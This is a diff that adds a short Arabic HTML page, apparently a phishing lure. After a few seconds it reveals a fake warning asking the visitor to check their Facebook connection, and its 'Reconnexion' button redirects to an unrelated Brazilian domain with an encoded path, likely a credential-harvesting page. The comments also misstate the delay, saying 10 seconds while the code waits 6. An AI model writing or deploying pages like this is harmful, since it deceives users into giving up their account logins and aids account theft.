@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>صفحة مع صورة وخط Droid Kufi</title>
+
+  <!-- ربط خط Droid Kufi من Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Droid+Kufi&display=swap" rel="stylesheet">
+
+  <style>
+    body {
+      font-family: 'Droid Kufi', sans-serif;
+      text-align: center;
+      padding: 20px;
+      background-color: #f9f9f9; 
+      margin: 0;
+    }
+
+    img.logo {
+      width: 300px; /* تم زيادة الحجم */
+      height: auto;
+      display: block;
+      margin: 0 auto 30px auto;
+      border-radius: 10px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    }
+
+    #message-box {
+      display: none;
+      background-color: #fff3cd;
+      color: #856404;
+      border: 1px solid #ffeeba;
+      padding: 20px;
+      border-radius: 8px;
+      max-width: 400px;
+      margin: 30px auto;
+    }
+
+    button {
+      font-family: 'Droid Kufi', sans-serif;
+      font-size: 16px;
+      padding: 10px 20px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- الصورة في الأعلى -->
+  <img src="https://zupimages.net/up/24/25/a3ad.png" alt="شعار الموقع" class="logo">
+
+  <h1>   </h1>
+  <p> </p>
+
+  <!-- رسالة تظهر بعد 10 ثوانٍ -->
+  <div id="message-box">
+    <h2>⚠️ تنبيه</h2>
+    <p>يرجى التحقق من اتصالك بالفايس بوك</p>
+    <button onclick="redirectToPage()"> Reconnexion  </button>
+  </div>
+
+  <script>
+    // إظهار الرسالة بعد 10 ثوانٍ
+    setTimeout(function() {
+      document.getElementById("message-box").style.display = "block";
+    }, 6000); // 6000 مللي ثانية = 10 ثوانٍ
+
+    // وظيفة إعادة التوجيه عند الضغط على الزر
+    function redirectToPage() {
+      window.location.href = "https://ryuzagoncalves.com.br/ZnIvNE4wOTNRNE43YzdUM04="; // استبدل هذا الرابط بما تريد
+    }
+  </script>
+
+</body>
+</html>
